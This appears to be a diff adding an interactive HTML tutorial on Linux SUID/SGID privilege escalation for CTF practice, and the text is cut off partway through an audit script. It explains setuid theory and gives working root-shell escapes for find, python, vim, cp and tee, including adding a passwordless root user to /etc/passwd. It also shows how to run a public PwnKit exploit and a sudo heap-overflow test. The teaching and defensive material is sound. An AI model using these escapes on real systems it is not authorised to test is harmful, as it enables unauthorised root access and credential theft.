@@ -1,0 +1,586 @@
+
+<style>
+*{box-sizing:border-box;margin:0;padding:0;}
+.wrap{padding:1rem 0;font-family:var(--font-sans);}
+.tab-bar{display:flex;gap:0;border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-lg);overflow:hidden;margin-bottom:1.25rem;}
+.tab{flex:1;padding:9px 6px;font-size:12px;background:transparent;border:none;border-right:0.5px solid var(--color-border-tertiary);cursor:pointer;color:var(--color-text-secondary);transition:all 0.15s;line-height:1.3;text-align:center;}
+.tab:last-child{border-right:none;}
+.tab.active{background:var(--color-background-secondary);color:var(--color-text-primary);font-weight:500;}
+.tab:hover:not(.active){background:var(--color-background-secondary);}
+.section{margin-bottom:14px;}
+.card{background:var(--color-background-primary);border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-lg);padding:14px 16px;margin-bottom:10px;}
+.card-title{font-size:14px;font-weight:500;color:var(--color-text-primary);margin-bottom:8px;}
+.card-desc{font-size:13px;color:var(--color-text-secondary);line-height:1.65;margin-bottom:10px;}
+.terminal{background:#161616;border-radius:var(--border-radius-md);padding:11px 13px;font-family:var(--font-mono);font-size:12px;line-height:1.85;color:#e2e2e2;margin-bottom:8px;position:relative;}
+.p{color:#5DCAA5;}.c{color:#e2e2e2;}.cm{color:#555;}.o{color:#999;font-size:11px;}
+.od{color:#E24B4A;font-size:11px;}.ow{color:#EF9F27;font-size:11px;}.og{color:#5DCAA5;font-size:11px;}
+.cp-btn{position:absolute;top:7px;right:7px;font-size:11px;padding:2px 8px;border-radius:6px;border:0.5px solid #333;background:#222;color:#888;cursor:pointer;}
+.cp-btn:hover{background:#2a2a2a;color:#ccc;}
+.badge{font-size:11px;padding:2px 9px;border-radius:999px;display:inline-block;margin-right:4px;margin-bottom:4px;}
+.bt{background:#E1F5EE;color:#085041;} .bp{background:#EEEDFE;color:#3C3489;}
+.ba{background:#FAEEDA;color:#633806;} .br{background:#FCEBEB;color:#791F1F;}
+.bb{background:#E6F1FB;color:#0C447C;} .bg{background:#EAF3DE;color:#27500A;}
+.bgr{background:#F1EFE8;color:#444441;}
+@media(prefers-color-scheme:dark){
+.bt{background:#04342C;color:#9FE1CB;} .bp{background:#26215C;color:#CECBF6;}
+.ba{background:#412402;color:#FAC775;} .br{background:#501313;color:#F7C1C1;}
+.bb{background:#042C53;color:#B5D4F4;} .bg{background:#173404;color:#C0DD97;}
+.bgr{background:#2C2C2A;color:#D3D1C7;}
+}
+.warn-box{background:var(--color-background-warning);border:0.5px solid var(--color-border-warning);border-radius:var(--border-radius-md);padding:9px 12px;font-size:12px;color:var(--color-text-warning);margin-bottom:10px;line-height:1.6;}
+.info-box{background:var(--color-background-info);border:0.5px solid var(--color-border-info);border-radius:var(--border-radius-md);padding:9px 12px;font-size:12px;color:var(--color-text-info);margin-bottom:10px;line-height:1.6;}
+.success-box{background:var(--color-background-success);border:0.5px solid var(--color-border-success);border-radius:var(--border-radius-md);padding:9px 12px;font-size:12px;color:var(--color-text-success);margin-bottom:10px;line-height:1.6;}
+.grid2{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:8px;margin-bottom:10px;}
+.mini-card{background:var(--color-background-secondary);border-radius:var(--border-radius-md);padding:10px 12px;border:0.5px solid var(--color-border-tertiary);}
+.mini-title{font-size:13px;font-weight:500;color:var(--color-text-primary);margin-bottom:4px;font-family:var(--font-mono);}
+.mini-desc{font-size:11.5px;color:var(--color-text-secondary);line-height:1.5;margin-bottom:6px;}
+.mini-cmd{font-family:var(--font-mono);font-size:11px;color:var(--color-text-secondary);background:var(--color-background-primary);padding:4px 7px;border-radius:4px;border:0.5px solid var(--color-border-tertiary);line-height:1.6;}
+.perm-table{width:100%;font-size:12px;border-collapse:collapse;margin-bottom:10px;}
+.perm-table td,.perm-table th{padding:5px 8px;border-bottom:0.5px solid var(--color-border-tertiary);color:var(--color-text-secondary);}
+.perm-table th{font-weight:500;color:var(--color-text-primary);font-size:11px;letter-spacing:0.03em;}
+.perm-table tr:last-child td{border-bottom:none;}
+.hl{color:var(--color-text-primary);}
+.flow{display:flex;align-items:center;gap:6px;flex-wrap:wrap;margin-bottom:10px;}
+.flow-box{padding:6px 12px;border-radius:var(--border-radius-md);font-size:12px;font-weight:500;}
+.flow-arr{color:var(--color-text-tertiary);font-size:14px;}
+.nav-bar{display:flex;gap:8px;margin-top:14px;}
+.nav-bar button{padding:6px 14px;font-size:12px;border-radius:var(--border-radius-md);border:0.5px solid var(--color-border-secondary);background:transparent;color:var(--color-text-secondary);cursor:pointer;}
+.nav-bar button:hover,.nav-bar button.pri{background:var(--color-background-secondary);color:var(--color-text-primary);}
+.sep{height:0.5px;background:var(--color-border-tertiary);margin:12px 0;}
+</style>
+
+<div class="wrap">
+<div class="tab-bar" id="tabs"></div>
+<div id="content"></div>
+</div>
+
+<script>
+const tabs = [
+  "Theory","Permissions","Finding","GTFOBins","Exploiting","Real CVEs","Defence","Full Script"
+];
+
+const pages = [
+
+// 0 THEORY
+()=>`
+<div class="card">
+<div class="card-title">What SUID/SGID actually is — from the kernel's perspective</div>
+<div class="card-desc">Linux is a multi-user OS. Every process has two user IDs tracked by the kernel at all times:</div>
+<div class="terminal">
+<div><span class="o">RUID  = Real UID       — who you actually ARE  (your login user)</span></div>
+<div><span class="o">EUID  = Effective UID  — who the PROCESS acts as (used for permission checks)</span></div>
+<div><span class="o">RGID  = Real GID       — your actual group</span></div>
+<div><span class="o">EGID  = Effective GID  — the group the process acts as</span></div>
+</div>
+<div class="card-desc">Normally RUID == EUID. But when a SUID binary runs, the kernel sets EUID to the file's owner. Every permission check (open file, write, fork, exec) uses EUID — not RUID. So if a SUID root binary spawns a shell, that shell inherits EUID=0.</div>
+<div class="flow">
+  <div class="flow-box bt">you (uid=1001)</div>
+  <div class="flow-arr">→</div>
+  <div class="flow-box bb">run /usr/bin/find (SUID root)</div>
+  <div class="flow-arr">→</div>
+  <div class="flow-box ba">kernel sets EUID=0</div>
+  <div class="flow-arr">→</div>
+  <div class="flow-box br">find spawns bash → bash has EUID=0 = ROOT</div>
+</div>
+</div>
+<div class="card">
+<div class="card-title">Why SUID was invented (legitimate use)</div>
+<div class="card-desc">Some operations need brief root access even for normal users. SUID solves this cleanly without giving users full root.</div>
+<div class="grid2">
+<div class="mini-card"><div class="mini-title">/usr/bin/passwd</div><div class="mini-desc">You need to write your hash to /etc/shadow — only root can write that file. SUID lets passwd do it temporarily on your behalf.</div></div>
+<div class="mini-card"><div class="mini-title">/usr/bin/ping</div><div class="mini-desc">Opening raw ICMP sockets requires CAP_NET_RAW — a root capability. SUID gives ping that access.</div></div>
+<div class="mini-card"><div class="mini-title">/usr/bin/sudo</div><div class="mini-desc">sudo's entire job is to run things as root. It validates /etc/sudoers first. SUID is what allows it to switch uid.</div></div>
+<div class="mini-card"><div class="mini-title">/usr/bin/su</div><div class="mini-desc">Switching users requires reading /etc/shadow to verify the target user's password. Only root can read shadow.</div></div>
+</div>
+</div>
+<div class="card">
+<div class="card-title">SGID — the group version</div>
+<div class="card-desc">SGID works identically but elevates EGID (effective group) instead of EUID. When set on a binary, the process runs as the file's group. When set on a directory, new files created inside inherit the directory's group — used for shared project folders.</div>
+<div class="terminal">
+<div><span class="o">SUID on file  →  process runs as file OWNER</span></div>
+<div><span class="o">SGID on file  →  process runs as file GROUP</span></div>
+<div><span class="o">SGID on dir   →  new files inherit directory group (not exploitable directly)</span></div>
+</div>
+</div>
+`,
+
+// 1 PERMISSIONS
+()=>`
+<div class="card">
+<div class="card-title">Reading Linux file permissions completely</div>
+<div class="card-desc">Every file has 10 characters in its permission string. Here's every position explained:</div>
+<div class="terminal">
+<div><span class="o">Position:  1    2 3 4    5 6 7    8 9 10</span></div>
+<div><span class="o">Example:   -    r w s    r - x    r - x</span></div>
+<div><span class="o">           │    │ │ │    │ │ │    │ │ │</span></div>
+<div><span class="o">           │    └─owner─┘    └─group─┘    └─others┘</span></div>
+<div><span class="o">           └─ file type (- = file, d = dir, l = symlink)</span></div>
+</div>
+<div class="card-desc">Position 4 is owner-execute. Normally 'x' (executable) or '-' (not executable). When SUID is set it becomes 's' (executable + SUID) or 'S' (SUID but NOT executable — misconfigured, useless).</div>
+<table class="perm-table">
+<tr><th>Char</th><th>Position</th><th>Meaning</th></tr>
+<tr><td class="hl">s</td><td>4 (owner execute)</td><td>SUID set AND file is executable — dangerous when owner is root</td></tr>
+<tr><td class="hl">S</td><td>4 (owner execute)</td><td>SUID set but NOT executable — useless, no threat</td></tr>
+<tr><td class="hl">s</td><td>7 (group execute)</td><td>SGID set AND file is executable</td></tr>
+<tr><td class="hl">S</td><td>7 (group execute)</td><td>SGID set but NOT executable — useless</td></tr>
+<tr><td class="hl">t</td><td>10 (others execute)</td><td>Sticky bit — only used on directories like /tmp</td></tr>
+</table>
+</div>
+<div class="card">
+<div class="card-title">Octal permission numbers — how the math works</div>
+<div class="card-desc">Permissions are stored as octal (base-8) numbers. Each bit has a value:</div>
+<div class="terminal">
+<div><span class="o">r = 4,  w = 2,  x = 1,  SUID = 4000,  SGID = 2000,  Sticky = 1000</span></div>
+<div><span class="c"> </span></div>
+<div><span class="o">rwsr-xr-x  =  4755</span></div>
+<div><span class="o">            │  ││└─ others: r-x = 4+0+1 = 5</span></div>
+<div><span class="o">            │  │└── group:  r-x = 4+0+1 = 5</span></div>
+<div><span class="o">            │  └─── owner:  rws = 4+2+1 = 7</span></div>
+<div><span class="o">            └────── special: SUID = 4</span></div>
+<div><span class="c"> </span></div>
+<div><span class="o">chmod 4755 /usr/bin/find   ← sets SUID + rwxr-xr-x</span></div>
+<div><span class="o">chmod u+s  /usr/bin/find   ← same thing, symbolic form</span></div>
+<div><span class="o">chmod u-s  /usr/bin/find   ← removes SUID</span></div>
+</div>
+</div>
+<div class="card">
+<div class="card-title">The find -perm flag — exactly what /4000 means</div>
+<div class="terminal">
+<div><span class="p">$</span><span class="c"> find / -perm /4000</span><span class="cm">  # / means: match if ANY of these bits are set</span></div>
+<div><span class="p">$</span><span class="c"> find / -perm -4000</span><span class="cm">  # - means: match if ALL of these bits are set</span></div>
+<div><span class="p">$</span><span class="c"> find / -perm  4000</span><span class="cm">  # exact match: ONLY this permission, nothing else</span></div>
+<div><span class="c"> </span></div>
+<div><span class="o">Use /4000 — it catches SUID regardless of other bits</span></div>
+<div><span class="o">Use /6000 — catches both SUID (4000) AND SGID (2000)</span></div>
+</div>
+</div>
+`,
+
+// 2 FINDING
+()=>`
+<div class="card">
+<div class="card-title">The complete SUID/SGID hunting command set</div>
+<div class="terminal" id="t-find">
+<div><span class="cm"># Basic — every SUID file on the system</span></div>
+<div><span class="p">$</span><span class="c"> find / -perm /4000 -type f 2>/dev/null</span></div>
+<div><span class="c"> </span></div>
+<div><span class="cm"># With full details (permissions, owner, size)</span></div>
+<div><span class="p">$</span><span class="c"> find / -perm /4000 -type f 2>/dev/null -ls</span></div>
+<div><span class="c"> </span></div>
+<div><span class="cm"># SGID only</span></div>
+<div><span class="p">$</span><span class="c"> find / -perm /2000 -type f 2>/dev/null</span></div>
+<div><span class="c"> </span></div>
+<div><span class="cm"># Both SUID and SGID in one command</span></div>
+<div><span class="p">$</span><span class="c"> find / -perm /6000 -type f 2>/dev/null</span></div>
+<div><span class="c"> </span></div>
+<div><span class="cm"># Filter noise — only show non-standard ones</span></div>
+<div><span class="p">$</span><span class="c"> find / -perm /4000 -type f 2>/dev/null | grep -Ev '(passwd|sudo|su$|newgrp|gpasswd|chfn|chsh|mount|umount|ping|pkexec)'</span></div>
+<div><span class="c"> </span></div>
+<div><span class="cm"># Immediately flag GTFOBins candidates</span></div>
+<div><span class="p">$</span><span class="c"> find / -perm /4000 -type f 2>/dev/null | grep -E '(find|python|perl|ruby|vim|nano|nmap|bash|sh|awk|tee|cp|mv|less|more|curl|wget|tar|zip|env|cut)'</span></div>
+<button class="cp-btn" onclick="cp('find / -perm /4000 -type f 2>/dev/null\nfind / -perm /4000 -type f 2>/dev/null -ls\nfind / -perm /2000 -type f 2>/dev/null\nfind / -perm /6000 -type f 2>/dev/null',this)">Copy</button>
+</div>
+</div>
+<div class="card">
+<div class="card-title">What each part of the command does</div>
+<table class="perm-table">
+<tr><th>Part</th><th>What it does</th><th>Without it</th></tr>
+<tr><td class="hl">find /</td><td>Start from filesystem root — scan everything</td><td>Only scans current dir</td></tr>
+<tr><td class="hl">-perm /4000</td><td>Match files with SUID bit set</td><td>No filter = all files</td></tr>
+<tr><td class="hl">-type f</td><td>Regular files only, skip directories</td><td>Directories with SUID flood output</td></tr>
+<tr><td class="hl">2>/dev/null</td><td>Send all errors to void (permission denied)</td><td>Hundreds of error lines drown results</td></tr>
+<tr><td class="hl">-ls</td><td>Show full ls-style output with owner/size</td><td>Just filenames, no details</td></tr>
+<tr><td class="hl">| sort</td><td>Alphabetical order — easier to spot anomalies</td><td>Random filesystem order</td></tr>
+</table>
+</div>
+<div class="card">
+<div class="card-title">Comparing against the known-safe baseline</div>
+<div class="card-desc">These are normal on any Debian/Ubuntu/Kali system. If your list matches only these — the system is clean. Anything extra is suspicious.</div>
+<div class="terminal">
+<div><span class="og">/usr/bin/chfn          ← safe</span></div>
+<div><span class="og">/usr/bin/chsh          ← safe</span></div>
+<div><span class="og">/usr/bin/gpasswd       ← safe</span></div>
+<div><span class="og">/usr/bin/mount         ← safe</span></div>
+<div><span class="og">/usr/bin/newgrp        ← safe</span></div>
+<div><span class="og">/usr/bin/passwd        ← safe</span></div>
+<div><span class="og">/usr/bin/su            ← safe</span></div>
+<div><span class="og">/usr/bin/sudo          ← safe</span></div>
+<div><span class="og">/usr/bin/umount        ← safe</span></div>
+<div><span class="og">/usr/lib/openssh/ssh-keysign  ← safe</span></div>
+<div><span class="c"> </span></div>
+<div><span class="od">/usr/bin/find          ← NOT expected → GTFOBins → root shell</span></div>
+<div><span class="od">/usr/bin/python3       ← NOT expected → GTFOBins → root shell</span></div>
+<div><span class="od">/usr/bin/vim           ← NOT expected → GTFOBins → root shell</span></div>
+<div><span class="od">/opt/backup_tool       ← custom binary → reverse engineer it</span></div>
+</div>
+</div>
+`,
+
+// 3 GTFOBINS
+()=>`
+<div class="info-box">GTFOBins (gtfobins.github.io) documents Unix binaries that can be abused when they have SUID set. The reason they work: these tools were designed to be powerful and flexible — that flexibility becomes a weapon with EUID=0.</div>
+<div class="grid2">
+${[
+{name:"find",risk:"br",cmd:`find . -exec /bin/bash -p \\;`,why:"find can execute arbitrary commands via -exec. -p prevents bash from dropping EUID back to RUID."},
+{name:"bash",risk:"br",cmd:`bash -p`,why:"bash -p = privileged mode. Keeps EUID=0. Without -p bash drops to RUID on startup for security."},
+{name:"python3",risk:"br",cmd:`python3 -c 'import os; os.execl("/bin/bash","bash","-p")'`,why:"os.execl replaces current process with bash while preserving the inherited EUID=0."},
+{name:"perl",risk:"br",cmd:`perl -e 'exec "/bin/bash -p"'`,why:"perl exec() inherits the process EUID. Spawns root bash."},
+{name:"vim",risk:"br",cmd:`vim -c ':!/bin/bash -p'`,why:"vim can run shell commands via :! Inside vim, this drops to a root bash."},
+{name:"awk",risk:"br",cmd:`awk 'BEGIN {system("/bin/bash -p")}'`,why:"awk's system() call inherits EUID=0 from the SUID awk process."},
+{name:"less",risk:"ba",cmd:`less /etc/passwd  then type: !/bin/bash`,why:"less has a ! shell escape. With SUID you get root bash from inside less."},
+{name:"nano",risk:"ba",cmd:`nano  then Ctrl+R Ctrl+X  then: reset; bash -p`,why:"nano has a read-file + execute mode. Combined with bash -p = root shell."},
+{name:"nmap",risk:"ba",cmd:`nmap --interactive  then: !sh`,why:"Old nmap (pre-5.x) had interactive mode with shell access. Still found on old HTB boxes."},
+{name:"cp",risk:"ba",cmd:`cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p`,why:"cp with SUID can copy bash, then set SUID on the copy. Run the copy with -p."},
+{name:"tee",risk:"ba",cmd:`echo 'user::0:0:root:/root:/bin/bash' | tee -a /etc/passwd`,why:"tee writes stdin to files as root. You can add a passwordless root user to /etc/passwd."},
+{name:"env",risk:"br",cmd:`env /bin/bash -p`,why:"env executes commands in a modified environment. With SUID it spawns root bash directly."},
+].map(g=>`
+<div class="mini-card">
+<div style="display:flex;align-items:center;gap:6px;margin-bottom:4px;">
+  <span class="mini-title">${g.name}</span>
+  <span class="badge ${g.risk}" style="font-size:10px;padding:1px 7px;">${g.risk==='br'?'critical':'high'}</span>
+</div>
+<div class="mini-desc">${g.why}</div>
+<div class="mini-cmd">${g.cmd.replace(/</g,'&lt;').replace(/>/g,'&gt;')}</div>
+</div>`).join('')}
+</div>
+`,
+
+// 4 EXPLOITING
+()=>`
+<div class="card">
+<div class="card-title">Step-by-step: full exploitation walkthrough</div>
+<div class="card-desc">Let's go from zero to root shell — exactly as you would on an HTB machine. Every command explained.</div>
+
+<div style="font-size:12px;color:var(--color-text-secondary);margin-bottom:5px;">Step 1 — land on box, scan immediately</div>
+<div class="terminal">
+<div><span class="p">$</span><span class="c"> find / -perm /4000 -type f 2>/dev/null | sort</span></div>
+<div><span class="og">/usr/bin/chfn</span></div>
+<div><span class="og">/usr/bin/passwd</span></div>
+<div><span class="og">/usr/bin/sudo</span></div>
+<div><span class="od">/usr/bin/find          ← this should NOT be here</span></div>
+<div><span class="od">/usr/bin/python3       ← this should NOT be here</span></div>
+</div>
+
+<div style="font-size:12px;color:var(--color-text-secondary);margin-bottom:5px;">Step 2 — verify SUID is actually set on the suspicious binary</div>
+<div class="terminal">
+<div><span class="p">$</span><span class="c"> ls -la /usr/bin/find</span></div>
+<div><span class="od">-rwsr-xr-x 1 root root 265840 /usr/bin/find</span></div>
+<div><span class="o">   ^</span></div>
+<div><span class="o">   s = SUID confirmed. owner = root. This is exploitable.</span></div>
+</div>
+
+<div style="font-size:12px;color:var(--color-text-secondary);margin-bottom:5px;">Step 3 — run the GTFOBins payload</div>
+<div class="terminal">
+<div><span class="p">$</span><span class="c"> find . -exec /bin/bash -p \;</span></div>
+<div><span class="od">bash-5.1#</span><span class="o"> ← prompt changed! # means root</span></div>
+</div>
+
+<div style="font-size:12px;color:var(--color-text-secondary);margin-bottom:5px;">Step 4 — confirm you are actually root</div>
+<div class="terminal">
+<div><span class="p">bash-5.1#</span><span class="c"> whoami</span></div>
+<div><span class="od">root</span></div>
+<div><span class="p">bash-5.1#</span><span class="c"> id</span></div>
+<div><span class="od">uid=1000(abhishek) gid=1000(abhishek) euid=0(root) egid=0(root)</span></div>
+<div><span class="o">                                       ^^^^^^^^^^^</span></div>
+<div><span class="o">                                       euid=0 is what matters. You ARE root.</span></div>
+</div>
+
+<div style="font-size:12px;color:var(--color-text-secondary);margin-bottom:5px;">Step 5 — prove root access by reading shadow file</div>
+<div class="terminal">
+<div><span class="p">bash-5.1#</span><span class="c"> cat /etc/shadow</span></div>
+<div><span class="od">root:$6$random$hashhashhashhash:19000:0:99999:7:::</span></div>
+<div><span class="od">abhishek:$6$salt$hashhash:19000:0:99999:7:::</span></div>
+<div><span class="o">If you can read this — you have full root. Game over.</span></div>
+</div>
+
+<div style="font-size:12px;color:var(--color-text-secondary);margin-bottom:5px;">Step 6 — on HTB, read the root flag</div>
+<div class="terminal">
+<div><span class="p">bash-5.1#</span><span class="c"> cat /root/root.txt</span></div>
+<div><span class="og">HTB{s0m3_fl4g_h3r3}</span></div>
+</div>
+</div>
+
+<div class="card">
+<div class="card-title">Practice this on your Kali RIGHT NOW</div>
+<div class="terminal" id="t-practice">
+<div><span class="cm"># Terminal — set up the vulnerability as root</span></div>
+<div><span class="p">$</span><span class="c"> sudo chmod u+s /usr/bin/find</span></div>
+<div><span class="p">$</span><span class="c"> ls -la /usr/bin/find</span><span class="cm">  # confirm 's' is there</span></div>
+<div><span class="c"> </span></div>
+<div><span class="cm"># Now exploit it as your normal user</span></div>
+<div><span class="p">$</span><span class="c"> find . -exec /bin/bash -p \;</span></div>
+<div><span class="p">bash-5.1#</span><span class="c"> id</span><span class="cm">              # confirm euid=0</span></div>
+<div><span class="p">bash-5.1#</span><span class="c"> cat /etc/shadow</span><span class="cm">  # read root-only file</span></div>
+<div><span class="p">bash-5.1#</span><span class="c"> exit</span></div>
+<div><span class="c"> </span></div>
+<div><span class="cm"># Clean up after practice</span></div>
+<div><span class="p">$</span><span class="c"> sudo chmod u-s /usr/bin/find</span></div>
+<div><span class="p">$</span><span class="c"> ls -la /usr/bin/find</span><span class="cm">  # confirm 'x' is back</span></div>
+<button class="cp-btn" onclick="cp('sudo chmod u+s /usr/bin/find\nfind . -exec /bin/bash -p \\;\nid\ncat /etc/shadow\nexit\nsudo chmod u-s /usr/bin/find',this)">Copy</button>
+</div>
+</div>
+`,
+
+// 5 REAL CVEs
+()=>`
+<div class="card">
+<div class="card-title">PwnKit — CVE-2021-4034 (pkexec SUID exploit)</div>
+<div class="card-desc">This is a real-world SUID vulnerability that affected every major Linux distro for 12+ years (2009–2022). pkexec is a SUID root binary from PolicyKit. A memory corruption bug in how it handled argc=0 allowed any local user to get root.</div>
+<div class="terminal">
+<div><span class="p">$</span><span class="c"> ls -la /usr/bin/pkexec</span></div>
+<div><span class="od">-rwsr-xr-x 1 root root /usr/bin/pkexec   ← SUID root binary</span></div>
+<div><span class="c"> </span></div>
+<div><span class="cm"># On unpatched systems (pre Jan 2022) — instant root</span></div>
+<div><span class="p">$</span><span class="c"> git clone https://github.com/berdav/CVE-2021-4034</span></div>
+<div><span class="p">$</span><span class="c"> cd CVE-2021-4034 && make && ./cve-2021-4034</span></div>
+<div><span class="od">root@target:/# whoami</span></div>
+<div><span class="od">root</span></div>
+<div><span class="c"> </span></div>
+<div><span class="cm"># Check if YOUR system is patched</span></div>
+<div><span class="p">$</span><span class="c"> pkexec --version</span><span class="cm">  # 0.105 or higher = patched</span></div>
+<div><span class="p">$</span><span class="c"> dpkg -l policykit-1</span><span class="cm">  # check installed version</span></div>
+</div>
+</div>
+<div class="card">
+<div class="card-title">DirtyCow — CVE-2016-5195 (kernel race condition)</div>
+<div class="card-desc">Not pure SUID, but often used alongside. A race condition in the kernel's copy-on-write mechanism allowed overwriting read-only files — including SUID binaries or /etc/passwd.</div>
+<div class="terminal">
+<div><span class="cm"># Check kernel version first</span></div>
+<div><span class="p">$</span><span class="c"> uname -r</span></div>
+<div><span class="o">4.4.0-116-generic   ← vulnerable (pre 4.8.3)</span></div>
+<div><span class="c"> </span></div>
+<div><span class="cm"># Typical attack: overwrite /etc/passwd to add root user</span></div>
+<div><span class="cm"># Patched in kernel 4.8.3 — common on old HTB machines</span></div>
+<div><span class="p">$</span><span class="c"> searchsploit dirtycow</span></div>
+<div><span class="p">$</span><span class="c"> searchsploit linux kernel 4.4 local privilege</span></div>
+</div>
+</div>
+<div class="card">
+<div class="card-title">sudo Baron Samedit — CVE-2021-3156</div>
+<div class="card-desc">A heap overflow in sudo (SUID root) — present since 2011. Affected sudo versions before 1.9.5p2. Allowed local users to get root shell through a crafted sudoedit argument.</div>
+<div class="terminal">
+<div><span class="cm"># Check sudo version</span></div>
+<div><span class="p">$</span><span class="c"> sudo --version</span></div>
+<div><span class="o">Sudo version 1.8.31   ← vulnerable</span></div>
+<div><span class="o">Sudo version 1.9.5p2  ← patched</span></div>
+<div><span class="c"> </span></div>
+<div><span class="cm"># Quick test — if this crashes, the system is likely vulnerable</span></div>
+<div><span class="p">$</span><span class="c"> sudoedit -s '\' $(python3 -c 'print("A"*1000)')</span></div>
+<div><span class="o">malloc(): corrupted top size   ← vulnerable!</span></div>
+<div><span class="o">Segmentation fault             ← also vulnerable</span></div>
+</div>
+</div>
+<div class="card">
+<div class="card-title">How to find CVEs for any binary on HTB</div>
+<div class="terminal">
+<div><span class="cm"># Step 1 — get the version of the binary</span></div>
+<div><span class="p">$</span><span class="c"> find --version</span></div>
+<div><span class="p">$</span><span class="c"> python3 --version</span></div>
+<div><span class="p">$</span><span class="c"> sudo --version</span></div>
+<div><span class="c"> </span></div>
+<div><span class="cm"># Step 2 — search for known exploits</span></div>
+<div><span class="p">$</span><span class="c"> searchsploit sudo 1.8.31</span></div>
+<div><span class="p">$</span><span class="c"> searchsploit pkexec</span></div>
+<div><span class="p">$</span><span class="c"> searchsploit linux kernel $(uname -r)</span></div>
+<div><span class="c"> </span></div>
+<div><span class="cm"># Step 3 — check NVD / GTFOBins / ExploitDB online</span></div>
+<div><span class="o">https://gtfobins.github.io</span></div>
+<div><span class="o">https://www.exploit-db.com</span></div>
+<div><span class="o">https://nvd.nist.gov</span></div>
+</div>
+</div>
+`,
+
+// 6 DEFENCE
+()=>`
+<div class="card">
+<div class="card-title">How to find and remove unnecessary SUID bits</div>
+<div class="terminal">
+<div><span class="cm"># Audit — find everything with SUID</span></div>
+<div><span class="p">$</span><span class="c"> find / -perm /4000 -type f 2>/dev/null | sort > /tmp/suid_audit.txt</span></div>
+<div><span class="c"> </span></div>
+<div><span class="cm"># Compare against your known-good baseline</span></div>
+<div><span class="p">$</span><span class="c"> diff /tmp/suid_baseline.txt /tmp/suid_audit.txt</span></div>
+<div><span class="c"> </span></div>
+<div><span class="cm"># Remove SUID from any binary that doesn't need it</span></div>
+<div><span class="p">$</span><span class="c"> sudo chmod u-s /usr/bin/find</span></div>
+<div><span class="p">$</span><span class="c"> sudo chmod u-s /usr/bin/python3</span></div>
+<div><span class="c"> </span></div>
+<div><span class="cm"># Verify it's gone</span></div>
+<div><span class="p">$</span><span class="c"> ls -la /usr/bin/find</span></div>
+<div><span class="og">-rwxr-xr-x   ← x not s = safe</span></div>
+</div>
+</div>
+<div class="card">
+<div class="card-title">Mount partitions with nosuid</div>
+<div class="card-desc">The nosuid mount option prevents SUID from working on that partition entirely — even if a binary has the bit set, the kernel ignores it.</div>
+<div class="terminal">
+<div><span class="cm"># Temporary — remount with nosuid</span></div>
+<div><span class="p">$</span><span class="c"> sudo mount -o remount,nosuid /home</span></div>
+<div><span class="p">$</span><span class="c"> sudo mount -o remount,nosuid /tmp</span></div>
+<div><span class="c"> </span></div>
+<div><span class="cm"># Permanent — edit /etc/fstab</span></div>
+<div><span class="p">$</span><span class="c"> sudo nano /etc/fstab</span></div>
+<div><span class="o">/dev/sdb1  /home  ext4  defaults,nosuid  0  2</span></div>
+<div><span class="c"> </span></div>
+<div><span class="cm"># Verify nosuid is active</span></div>
+<div><span class="p">$</span><span class="c"> mount | grep nosuid</span></div>
+</div>
+</div>
+<div class="card">
+<div class="card-title">Monitor SUID execution with auditd</div>
+<div class="terminal">
+<div><span class="cm"># Install auditd</span></div>
+<div><span class="p">$</span><span class="c"> sudo apt install auditd -y</span></div>
+<div><span class="c"> </span></div>
+<div><span class="cm"># Add a rule to log all SUID executions (euid=0 via execve)</span></div>
+<div><span class="p">$</span><span class="c"> sudo auditctl -a always,exit -F arch=b64 -S execve -F euid=0 -k suid_exec</span></div>
+<div><span class="c"> </span></div>
+<div><span class="cm"># Watch the audit log</span></div>
+<div><span class="p">$</span><span class="c"> sudo ausearch -k suid_exec | tail -20</span></div>
+<div><span class="c"> </span></div>
+<div><span class="cm"># Or watch live</span></div>
+<div><span class="p">$</span><span class="c"> sudo tail -f /var/log/audit/audit.log | grep suid_exec</span></div>
+</div>
+</div>
+<div class="card">
+<div class="card-title">Use capabilities instead of SUID where possible</div>
+<div class="card-desc">Linux capabilities let you grant specific root powers to binaries without full SUID. For example ping only needs CAP_NET_RAW — not full root.</div>
+<div class="terminal">
+<div><span class="cm"># Check what capabilities a binary has</span></div>
+<div><span class="p">$</span><span class="c"> getcap /usr/bin/ping</span></div>
+<div><span class="o">/usr/bin/ping cap_net_raw=ep</span></div>
+<div><span class="c"> </span></div>
+<div><span class="cm"># Remove SUID from ping and use capability instead</span></div>
+<div><span class="p">$</span><span class="c"> sudo chmod u-s /usr/bin/ping</span></div>
+<div><span class="p">$</span><span class="c"> sudo setcap cap_net_raw+ep /usr/bin/ping</span></div>
+<div><span class="c"> </span></div>
+<div><span class="cm"># List all binaries with capabilities set</span></div>
+<div><span class="p">$</span><span class="c"> getcap -r / 2>/dev/null</span></div>
+<div><span class="ow">Note: capabilities can ALSO be abused for privesc — always audit both!</span></div>
+</div>
+</div>
+`,
+
+// 7 FULL SCRIPT
+()=>`
+<div class="card">
+<div class="card-title">Complete SUID/SGID audit and exploit checker script</div>
+<div class="card-desc">Save this as suid_full_audit.sh — run it on any box you land on. It finds, categorises, and flags exploitable binaries automatically.</div>
+<div class="terminal" id="t-script">
+<div><span class="c">#!/bin/bash</span></div>
+<div><span class="c">RED='\\033[0;31m' YEL='\\033[0;33m' GRN='\\033[0;32m' NC='\\033[0m'</span></div>
+<div><span class="c">REPORT="suid_audit_$(hostname)_$(date +%Y%m%d_%H%M%S).txt"</span></div>
+<div><span class="c"> </span></div>
+<div><span class="c">SAFE="passwd|sudo|su$|newgrp|gpasswd|chfn|chsh|mount|umount|ping|pkexec|ssh-keysign|dbus|polkit|Xorg|chrome-sandbox|pppd|mount.cifs|mount.nfs|ntfs-3g|fusermount|kismet"</span></div>
+<div><span class="c">DANGER="find|python|perl|ruby|vim|nano|nmap|bash|\\bsh\\b|dash|awk|tee|cp|mv|less|more|curl|wget|tar|zip|env|cut|node|lua|php|gcc|make"</span></div>
+<div><span class="c"> </span></div>
+<div><span class="c">echo "=== SUID/SGID Full Audit ===" | tee $REPORT</span></div>
+<div><span class="c">echo "Host: $(hostname) | User: $(whoami) | Date: $(date)" | tee -a $REPORT</span></div>
+<div><span class="c">echo "Current ID: $(id)" | tee -a $REPORT</span></div>
+<div><span class="c"> </span></div>
+<div><span class="c">echo -e "\\n[*] All SUID binaries:" | tee -a $REPORT</span></div>
